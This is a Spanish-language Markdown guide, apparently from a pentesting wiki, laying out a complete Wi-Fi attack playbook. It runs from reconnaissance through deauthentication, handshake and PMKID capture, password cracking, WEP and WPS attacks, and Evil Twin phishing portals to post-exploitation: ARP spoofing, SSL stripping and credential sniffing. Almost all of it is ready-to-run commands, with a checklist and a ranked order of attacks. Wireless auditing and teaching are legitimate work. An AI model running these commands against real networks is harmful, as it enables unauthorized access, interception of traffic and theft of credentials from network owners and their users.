---
icon: wifi
---

# Ataques Wi-Fi

El hacking Wi-Fi tiene una progresión muy clara: reconocimiento pasivo → ataque activo → post-explotación. La fase de reconocimiento pasivo es crítica — cuanta más información tengas de la red objetivo antes de actuar, más efectivo y menos ruidoso será el ataque.

```
Regla de oro:
Escucha antes de hablar.
El reconocimiento pasivo no genera tráfico propio,
no alerta a los sistemas de detección y revela
todo lo que necesitas para elegir el ataque correcto.
```

### Preparación del entorno

#### Hardware necesario

```
□ Tarjeta Wi-Fi compatible con modo monitor e inyección de paquetes
  Recomendadas:
  → Alfa AWUS036ACH  (AC, dual band, chipset RTL8812AU)
  → Alfa AWUS036NH   (N, 2.4GHz, chipset RT3070 — muy estable)
  → Panda PAU09      (N, dual band, chipset RT5572)

□ Verificar compatibilidad con Linux:
  lsusb → buscar el chipset
  iw list → si muestra "Supported interface modes: monitor" → compatible

□ Antena externa (opcional pero recomendada para mayor alcance)
```

#### Configuración inicial

```bash
# 1. Identificar la interfaz Wi-Fi
iwconfig
ip link show

# 2. Desactivar gestores de red que interfieren con modo monitor
airmon-ng check
airmon-ng check kill   # mata procesos conflictivos (NetworkManager, wpa_supplicant)

# 3. Activar modo monitor
airmon-ng start wlan0
# La interfaz pasa a llamarse wlan0mon (o mon0 dependiendo del driver)

# Alternativa manual:
ip link set wlan0 down
iw wlan0 set monitor control
ip link set wlan0 up
iwconfig wlan0 mode monitor  # verificar

# 4. Verificar que el modo monitor está activo
iwconfig wlan0mon
# Debe mostrar: Mode:Monitor

# 5. Cambiar MAC address (anonimato)
ip link set wlan0mon down
macchanger -r wlan0mon        # MAC aleatoria
ip link set wlan0mon up
macchanger -s wlan0mon        # verificar la nueva MAC
```

### FASE 1 — Reconocimiento Pasivo

**Objetivo:** mapear todas las redes del entorno sin generar tráfico propio. No se inyecta ningún paquete — solo se escucha.

#### 1.1 — Escaneo general de redes

```bash
# Escuchar en todos los canales — vista general del entorno
airodump-ng wlan0mon

# Columnas importantes:
# BSSID    → MAC del AP (Access Point)
# PWR      → Potencia de señal (más negativo = más lejos)
# Beacons  → Tramas beacon enviadas por el AP
# #Data    → Paquetes de datos (actividad de la red)
# CH       → Canal
# ENC      → Tipo de cifrado (OPN, WEP, WPA, WPA2, WPA3)
# CIPHER   → Algoritmo de cifrado (CCMP, TKIP)
# AUTH     → Autenticación (PSK, MGT/EAPOL para Enterprise)
# ESSID    → Nombre de la red

# Sección inferior: STATIONs (clientes conectados)
# STATION  → MAC del cliente
# BSSID    → AP al que está conectado (o "not associated")
# Probes   → Redes que el cliente está buscando activamente

# Capturar y guardar para análisis posterior
airodump-ng wlan0mon -w reconocimiento --output-format csv,pcap
```

#### 1.2 — Reconocimiento por banda

```bash
# Por defecto airodump-ng escanea 2.4 GHz
# Para 5 GHz:
airodump-ng wlan0mon --band a

# Ambas bandas simultáneamente:
airodump-ng wlan0mon --band abg

# Saltar entre canales manualmente para ver redes que aparecen brevemente:
airodump-ng wlan0mon --channel-hop
```

#### 1.3 — Focalizarse en el objetivo

```bash
# Una vez identificada la red objetivo, focalizarse en ella:
airodump-ng wlan0mon \
    --bssid AA:BB:CC:DD:EE:FF \    # MAC del AP objetivo
    --channel 6 \                   # Canal del AP
    -w captura_objetivo             # Guardar captura

# Información clave a anotar:
# □ BSSID (MAC del AP)
# □ Canal
# □ Tipo de cifrado (WPA2 PSK, WPA2 Enterprise, WPA3...)
# □ MACs de los clientes conectados (STATIONs)
# □ Nivel de actividad (#Data packets)
# □ Si hay clientes conectados → imprescindible para captura de handshake
```

#### 1.4 — Análisis de clientes y redes ocultas

```bash
# Redes ocultas (ESSID vacío o "<length:  0>"):
# El ESSID está oculto pero el AP sigue emitiendo beacons
# Cuando un cliente se conecta, el ESSID se revela en los Probe Response
# → Esperar o forzar reconexión de un cliente (Fase 3)

# Clientes "not associated" que buscan redes:
# En la sección STATION, los que no tienen BSSID asociado
# En "Probes" se ven las redes que están buscando
# → Útil para Evil Twin: crear AP con ese nombre → cliente se conecta automáticamente

# Guardar todo el reconocimiento:
# El .csv generado por airodump-ng contiene toda la info para análisis offline
```

#### 1.5 — Información adicional del entorno

```bash
# Análisis del pcap capturado con Wireshark
wireshark captura_objetivo-01.cap

# Filtros útiles en Wireshark:
# wlan.fc.type_subtype == 0x08    → solo tramas beacon
# wlan.fc.type_subtype == 0x04    → solo probe requests
# eapol                            → handshakes WPA
# wlan.addr == AA:BB:CC:DD:EE:FF  → tráfico de un cliente específico

# Información extraíble del pcap:
# → Fabricante de los dispositivos (OUI de la MAC)
# → Potencia de señal de cada cliente
# → Actividad (cuántos datos intercambia cada cliente)
# → Presencia de redes Enterprise (tramas EAPOL)
```

### FASE 2 — Análisis y Selección de Vector de Ataque

**Objetivo:** con la información del reconocimiento, elegir el ataque más adecuado.

```
┌─────────────────────────────────────────────────────┐
│  Red objetivo identificada                          │
│                                                     │
│  ¿Qué tipo de cifrado?                             │
│                                                     │
│  ┌──────────┐  ┌──────────┐  ┌──────────────────┐  │
│  │   OPN    │  │   WEP    │  │ WPA/WPA2/WPA3    │  │
│  │  Abierta │  │ (legacy) │  │                  │  │
│  └────┬─────┘  └────┬─────┘  └────────┬─────────┘  │
│       ↓             ↓                  ↓            │
│  Conectar     Crack IVs          ┌─────┴──────┐     │
│  directamente  (aircrack)        │    PSK     │     │
│  → capturar                      │ (personal) │     │
│    tráfico                       └─────┬──────┘     │
│                                        │            │
│                             ¿Hay clientes conectados?│
│                             ┌────┴────┐              │
│                             │   SÍ   │   NO         │
│                             ↓        ↓              │
│                        Deauth →  PMKID attack       │
│                        capturar  (sin clientes)     │
│                        handshake                    │
└─────────────────────────────────────────────────────┘

WPA2 Enterprise (AUTH: MGT):
→ Evil Twin Enterprise (capturar credenciales RADIUS)
→ No se puede crackear la PSK (no hay PSK)

WPA3:
→ Dragonblood attacks (CVE-2019-9494) si versión vulnerable
→ Evil Twin (más difícil, los clientes verifican el AP)
```

### FASE 3 — Ataque a WPA2 PSK&#x20;

#### 3.1 — Captura del handshake de 4 vías

```bash
# Terminal 1: capturar tráfico del AP objetivo
airodump-ng wlan0mon \
    --bssid AA:BB:CC:DD:EE:FF \
    --channel 6 \
    -w handshake_captura

# El handshake se captura cuando un cliente se conecta o reconecta al AP
# Esperar a que un cliente se conecte naturalmente... O acelerar el proceso:
```

**Método A — Deauthentication (activo, más rápido)**

```bash
# Terminal 2: enviar paquetes de deautenticación para forzar reconexión
# Deauth global (a todos los clientes del AP)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
#            ↑   ↑  ↑
#        deauth  5  BSSID del AP

# Deauth dirigido a un cliente específico (menos ruidoso)
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
#                                        ↑ MAC del cliente

# En Terminal 1 verás: [ WPA handshake: AA:BB:CC:DD:EE:FF ]
# Eso indica que el handshake fue capturado con éxito
```

**Método B — PMKID Attack (sin clientes, más moderno)**

```bash
# No requiere esperar a que haya clientes conectados
# Funciona directamente contra el AP

# Con hcxdumptool (capturar el PMKID)
hcxdumptool -o pmkid_captura.pcapng -i wlan0mon \
    --filterlist_ap=ap_mac.txt \
    --filtermode=2

# Convertir para hashcat
hcxpcapngtool -o pmkid_hash.txt pmkid_captura.pcapng

# El hash resultante tiene formato:
# WPA*01*PMKID*BSSID*CLIENTMAC*ESSID
```

#### 3.2 — Verificar que el handshake es válido

```bash
# Método 1: aircrack-ng (rápido)
aircrack-ng handshake_captura-01.cap
# Debe mostrar: "1 handshake" para el AP objetivo

# Método 2: Wireshark
wireshark handshake_captura-01.cap
# Filtro: eapol
# Debe haber 4 paquetes EAPOL (el handshake de 4 vías)
# Los mensajes 1,2,3,4 del handshake deben estar todos presentes
# (mensaje 2 y 4 son los que contienen la clave para crackear)

# Método 3: cowpatty
cowpatty -r handshake_captura-01.cap -c
# "valid 4-way handshake"
```

#### 3.3 — Convertir captura al formato de hashcat

```bash
# hashcat necesita el formato .hccapx o .22000
hcxpcapngtool -o hash.22000 handshake_captura-01.cap
# O con hcxtools:
hcxpcaptool -z hash.hccapx handshake_captura-01.cap
```

#### 3.4 — Crackeo de la contraseña

```bash
# ===== AIRCRACK-NG (CPU) =====

# Por diccionario
aircrack-ng handshake_captura-01.cap -w /usr/share/wordlists/rockyou.txt

# Por diccionario específico para redes Wi-Fi
aircrack-ng handshake_captura-01.cap -w /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt


# ===== HASHCAT (GPU — mucho más rápido) =====

# Formato del ataque: -m 22000 (WPA-PBKDF2-PMKID+EAPOL)
# O -m 2500 para .hccapx (legacy)

# Ataque por diccionario
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt

# Ataque con reglas (expande el diccionario — muy efectivo)
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule

# Regla específica para Wi-Fi (añade números al final, mayúscula inicial)
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/wifi-wpa.rule

# Ataque por máscara (fuerza bruta con patrón)
# 8 dígitos (contraseñas telefónicas comunes en routers España):
hashcat -m 22000 hash.22000 -a 3 ?d?d?d?d?d?d?d?d

# Combinación de máscara: Mayúscula + 5 minúsculas + 3 dígitos
hashcat -m 22000 hash.22000 -a 3 ?u?l?l?l?l?l?d?d?d

# Ataque de combinación (combinar dos diccionarios)
hashcat -m 22000 hash.22000 -a 1 dict1.txt dict2.txt

# Ver progreso sin interrumpir:
# Presionar 's' durante el ataque

# Wordlists específicas para Wi-Fi:
# /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
# /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top62.txt
# Generar wordlist personalizada basada en el SSID:
crunch 8 12 -t NombreRed@@@@ -o wordlist_custom.txt
```

### FASE 4 — Evil Twin (Rogue AP)

**Objetivo:** crear un punto de acceso falso que suplante al legítimo para capturar credenciales o tráfico.

#### 4.1 — Evil Twin básico (captura de contraseña WPA via portal cautivo)

```bash
# La técnica más completa es con airgeddon o wifiphisher
# Proceso manual con hostapd + dhcp + portal web:

# Paso 1: Crear el AP falso con el mismo SSID
# Archivo: /etc/hostapd/hostapd.conf
interface=wlan0mon
driver=nl80211
ssid=NombreRedObjetivo         # Mismo nombre que la red legítima
hw_mode=g
channel=6                       # Mismo canal que la red legítima
macaddr_acl=0
ignore_broadcast_ssid=0

# Paso 2: Servidor DHCP para dar IPs a los clientes
# Archivo: /etc/dhcp/dhcpd.conf
subnet 192.168.1.0 netmask 255.255.255.0 {
    range 192.168.1.2 192.168.1.30;
    option routers 192.168.1.1;
    option domain-name-servers 192.168.1.1;
}

# Paso 3: DNS falso que redirige todo al portal
# dnsmasq redirige todas las peticiones DNS al portal cautivo

# Paso 4: Portal web que pide la contraseña del Wi-Fi
# El usuario ve: "Su conexión requiere re-autenticación. Ingrese la contraseña del Wi-Fi"
# Al enviar: la contraseña se guarda y se verifica contra el hash capturado

# Paso 5: Deauth continuo al AP legítimo para forzar a los clientes al falso
aireplay-ng -0 0 -a BSSID_AP_LEGITIMO wlan0mon   # 0 = infinito
```

**Con herramientas automatizadas**

```bash
# Airgeddon — todo en uno, muy completo
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon && bash airgeddon.sh
# Menú: 5 (Evil Twin attacks) → 9 (WPA/WPA2 Evil Twin AP attack)

# Wifiphisher — Evil Twin con múltiples templates de portal
pip3 install wifiphisher
sudo wifiphisher --essid "NombreRedObjetivo" -phishingscenario firmware-upgrade
# Templates disponibles:
# firmware-upgrade     → simula actualización de firmware del router
# wifi-connect         → portal estilo hoteles/aeropuertos
# oauth-login          → login falso con Google/Facebook
```

#### 4.2 — Rogue AP (capturar tráfico sin SSL)

```bash
# Crear AP abierto (sin contraseña) para que los clientes se conecten
# y capturar todo su tráfico HTTP en claro

# Configurar wlan0 como AP y wlan1 con conexión a internet (NAT)
# Los clientes tienen internet pero nosotros vemos todo su tráfico

# Sniffing del tráfico
tcpdump -i wlan0mon -w trafico.pcap
# Análisis: wireshark trafico.pcap → filtrar por http, ftp, pop3

# Extracción de credenciales automática
python3 net-creds.py -i wlan0 -p trafico.pcap
```

#### 4.3 — Evil Twin Enterprise (WPA2 Enterprise)

```bash
# Para redes Enterprise (AUTH: MGT en airodump-ng)
# El objetivo es capturar el hash MSCHAPV2 del usuario

# hostapd-wpe (Wireless Pwnage Edition) — versión modificada de hostapd
# Actúa como servidor RADIUS falso y captura credenciales

# Instalación
apt install hostapd-wpe

# Configurar hostapd-wpe.conf con el SSID de la red Enterprise objetivo
# Iniciar el AP falso:
hostapd-wpe hostapd-wpe.conf

# Los clientes que se conecten intentarán autenticarse via PEAP/MSCHAPV2
# hostapd-wpe captura el challenge/response en /var/log/hostapd-wpe.log

# Crackear el hash MSCHAPV2 capturado
# Formato: User: usuario | Challenge: XXX | Response: YYY
asleap -C CHALLENGE -R RESPONSE -W /usr/share/wordlists/rockyou.txt
# O con hashcat -m 5500 (NTLMv1) o -m 5600 (NTLMv2)
```

### FASE 5 — Ataques Adicionales

#### 5.1 — WEP (redes legacy)

```bash
# WEP es completamente roto — solo necesitas IVs (initialization vectors)
# Con ~50.000-100.000 IVs de datos se puede crackear cualquier clave WEP

# Terminal 1: capturar tráfico
airodump-ng --bssid BSSID_AP --channel CH \
    --ivs -w captura_wep wlan0mon

# Terminal 2: inyectar tráfico para generar IVs (si la red tiene poco tráfico)
# Fake authentication primero
aireplay-ng -1 0 -a BSSID_AP wlan0mon

# ARP replay para generar IVs masivamente
aireplay-ng -3 -b BSSID_AP wlan0mon

# Terminal 3: crackear cuando haya suficientes IVs (#Data > 50.000)
aircrack-ng captura_wep-01.ivs
# Con 50K IVs: clave de 64 bits crackeada
# Con 200K IVs: clave de 128 bits crackeada casi garantizado
```

#### 5.2 — WPS PIN Attack

```bash
# WPS (Wi-Fi Protected Setup) tiene una vulnerabilidad en el PIN de 8 dígitos
# El verificador divide el PIN en dos mitades de 4 dígitos → solo 11.000 intentos

# Verificar si WPS está activo y en qué modo
wash -i wlan0mon
# Columnas importantes:
# WPS Locked: No → vulnerable al ataque
# WPS Locked: Yes → el AP bloqueó WPS tras intentos fallidos

# Ataque Pixie Dust (offline, instantáneo si el AP es vulnerable)
reaver -i wlan0mon -b BSSID_AP -K 1 -vvv
# -K 1 activa Pixie Dust
# Si el AP es vulnerable: PIN + contraseña en segundos

# Ataque de fuerza bruta online (lento: ~4-10 horas si no hay lockout)
reaver -i wlan0mon -b BSSID_AP -vvv
# Con delay para evitar lockout:
reaver -i wlan0mon -b BSSID_AP -d 5 -r 3:15 -vvv
# -d 5: 5 segundos entre intentos
# -r 3:15: descansar 15 segundos cada 3 intentos

# Bully (alternativa a reaver)
bully wlan0mon -b BSSID_AP -d -v 3
```

#### 5.3 — PMKID Attack detallado (sin clientes)

```bash
# Más moderno que el handshake clásico
# No necesita esperar a que se conecte ningún cliente

# Paso 1: Capturar el PMKID
hcxdumptool -o pmkid.pcapng -i wlan0mon \
    --enable_status=3 \
    --filterlist_ap=<(echo "BSSID_SIN_PUNTOS") \
    --filtermode=2
# Detener cuando veas "PMKID found"

# Paso 2: Extraer el hash
hcxpcapngtool -o pmkid_hash.22000 pmkid.pcapng
cat pmkid_hash.22000
# Formato: WPA*01*PMKID*AABBCCDDEEFF*...

# Paso 3: Crackear con hashcat
hashcat -m 22000 pmkid_hash.22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 pmkid_hash.22000 /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule
```

#### 5.4 — Captura de tráfico en red abierta

```bash
# En redes Wi-Fi abiertas (aeropuertos, cafeterías, hoteles):
# Todo el tráfico HTTP está en claro y es capturable

# Poner interfaz en modo monitor en el canal correcto
iwconfig wlan0mon channel 6

# Capturar TODO el tráfico
airodump-ng wlan0mon --channel 6 -w captura_abierta

# Analizar con Wireshark
wireshark captura_abierta-01.cap
# Filtros útiles:
# http.request.method == POST        → envíos de formularios (credenciales)
# ftp                                 → login FTP en claro
# pop                                 → emails POP3 en claro
# http contains "password"           → buscar passwords en HTTP
# http.authheader                    → HTTP Basic Auth en claro

# net-creds: extracción automática de credenciales
python3 net-creds.py -p captura_abierta-01.cap
```

### FASE 6 — Post-Explotación

#### 6.1 — Una vez conectado a la red

```bash
# Reconocimiento de la red interna
ip a                       # Tu IP y la subred
ip route                   # Gateway
nmap -sn 192.168.1.0/24   # Hosts activos en la red

# Identificar el router/gateway
nmap -sV -p 80,443,22,23,8080 192.168.1.1
# Paneles comunes del router: http://192.168.1.1 o http://192.168.0.1

# Credenciales por defecto del router
# Probar: admin/admin, admin/1234, admin/(vacío), admin/password
# O buscar en: https://www.routerpasswords.com

# Escaneo completo de la red interna
nmap -sV -O --open 192.168.1.0/24 -oA scan_red_wifi
```

#### 6.2 — MITM en la red Wi-Fi

```bash
# Una vez en la misma red, realizar ARP spoofing para MITM

# Habilitar IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP Spoofing contra todos los clientes
arpspoof -i wlan0 -t 192.168.1.0/24 192.168.1.1 &
arpspoof -i wlan0 -t 192.168.1.1 192.168.1.0/24 &

# O con bettercap (más moderno)
bettercap -iface wlan0
# En la consola de bettercap:
net.probe on
set arp.spoof.targets 192.168.1.0/24
arp.spoof on
net.sniff on

# SSL Stripping (downgrade HTTPS → HTTP)
set https.proxy.sslstrip true
https.proxy on
```

#### 6.3 — Captura de credenciales post-conexión

```bash
# Responder para capturar hashes NTLM (si hay dispositivos Windows)
responder -I wlan0 -rdwv

# Wireshark en la interfaz conectada
tcpdump -i wlan0 -w captura_interna.pcap
wireshark captura_interna.pcap

# dsniff para credenciales en protocolos legacy
dsniff -i wlan0   # FTP, Telnet, HTTP Basic, POP3, SMTP...
urlsnarf -i wlan0 # URLs visitadas
```

### Checklist completo

```
PREPARACIÓN:
□ Tarjeta compatible con modo monitor e inyección
□ Drivers instalados y funcionando
□ Procesos conflictivos eliminados (airmon-ng check kill)
□ Modo monitor activado y verificado
□ MAC aleatoria configurada (opcional)

RECONOCIMIENTO PASIVO:
□ airodump-ng general → vista de todas las redes
□ Identificado el objetivo (BSSID, canal, cifrado, clientes)
□ Captura iniciada focalizada en el objetivo
□ Tipo de cifrado determinado (WEP/WPA2-PSK/WPA2-Enterprise/WPA3/OPN)
□ WPS status verificado con wash
□ Clientes conectados anotados (MACs)
□ Guardado el pcap para análisis offline

SELECCIÓN DE VECTOR:
□ Determinado el tipo de cifrado
□ Determinado si hay clientes conectados
□ Vector seleccionado según el árbol de decisión

WPA2 PSK (si aplica):
□ Captura de handshake iniciada
□ Deauth enviado si no hay actividad de reconexión
□ Handshake verificado con aircrack-ng o cowpatty
□ Convertido al formato de hashcat (.22000)
□ Ataque por diccionario con rockyou.txt
□ Ataque con reglas (best64, wifi-wpa)
□ Ataque por máscara si aplica (8 dígitos, patrón)
□ Wordlist personalizada basada en el SSID/empresa

PMKID (si aplica):
□ hcxdumptool ejecutado hasta capturar PMKID
□ Hash extraído con hcxpcapngtool
□ Mismo proceso de crackeo con hashcat

WPS (si aplica):
□ wash confirma que WPS no está bloqueado
□ Pixie Dust probado primero (reaver -K 1)
□ Si falla: fuerza bruta con delay

Evil Twin (si aplica):
□ SSID, canal y BSSID de la red legítima anotados
□ AP falso creado con mismo SSID
□ Deauth continuo al AP legítimo
□ Portal cautivo o receptor de credenciales configurado
□ Tráfico de clientes capturado

POST-EXPLOTACIÓN (si hay acceso):
□ Red interna mapeada (nmap)
□ Panel del router accedido
□ Credenciales por defecto probadas
□ MITM configurado si se necesita
□ Tráfico de la red capturado
```

### Orden de prioridad&#x20;

```
Primera opción — PMKID attack:
→ No requiere clientes conectados
→ No genera deauth (menos ruidoso)
→ Proceso: hcxdumptool → hcxpcapngtool → hashcat
→ Si la red tiene contraseña débil → crackeada en minutos

Segunda opción — Handshake + Deauth:
→ Si hay clientes conectados: airodump-ng + aireplay-ng -0
→ Verificar handshake + hashcat
→ Más rápido si hay muchos clientes conectados

Tercera opción — WPS Pixie Dust:
→ Si WPS está activo y no bloqueado: reaver -K 1
→ Instantáneo si el AP es vulnerable

Cuarta opción — Evil Twin:
→ Cuando el cracking no funciona (contraseña muy robusta)
→ Requiere más tiempo de setup pero no depende del cracking
```

> 💡 PMKID attack es la técnica recomendada hoy en día porque no requiere esperar a que ningún cliente se conecte, no genera tráfico de deauth (más sigiloso), y produce el mismo hash crackeable que el handshake clásico.

> 🔍 La calidad del diccionario + las reglas de hashcat son lo que determina el éxito del cracking, no la velocidad del ataque. Tener una wordlist específica para el objetivo (basada en el nombre de la empresa, ciudad, SSID) multiplica las probabilidades de éxito.

> ⚠️ Los ataques de deautenticación generan tráfico visible y pueden ser detectados por sistemas IDS Wi-Fi. En auditorías reales, preferir siempre PMKID (sin deauth) sobre el handshake clásico cuando sea posible.
